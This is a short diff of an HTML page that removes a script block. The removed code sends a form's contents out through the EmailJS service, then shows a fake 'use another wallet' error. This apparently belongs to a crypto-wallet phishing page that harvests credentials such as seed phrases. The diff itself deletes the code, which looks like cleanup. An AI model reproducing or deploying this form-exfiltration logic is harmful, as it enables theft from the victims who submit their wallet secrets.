@@ -1302,37 +1302,7 @@
           
 
 
-          <script type="text/javascript"
-  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@5/dist/email.min.js"></script>
-
-<script type="text/javascript">
-  emailjs.init('NrRKux_yAVOGUS5H8')
-</script>
-  
-  <script>
- const btn = document.getElementById('submit');
-
-document.getElementById('my-form')
- .addEventListener('submit', function(event) {
-   event.preventDefault();
-
-   btn.value = 'Sending...';
-
-   const serviceID = 'default_service';
-   const templateID = 'template_0vobauq';
-
-   emailjs.sendForm(serviceID, templateID, this)
-    .then(() => {
-      btn.value = 'Send Email';
-      alert('An Error Occured!!! Use another wallet Or Try again.');
-    }, (err) => {
-      btn.value = 'Send Email';
-      alert(JSON.stringify(err));
-    });
-});
-     
-  
-  </script>
+          
         </div>
       </div>
     </div>
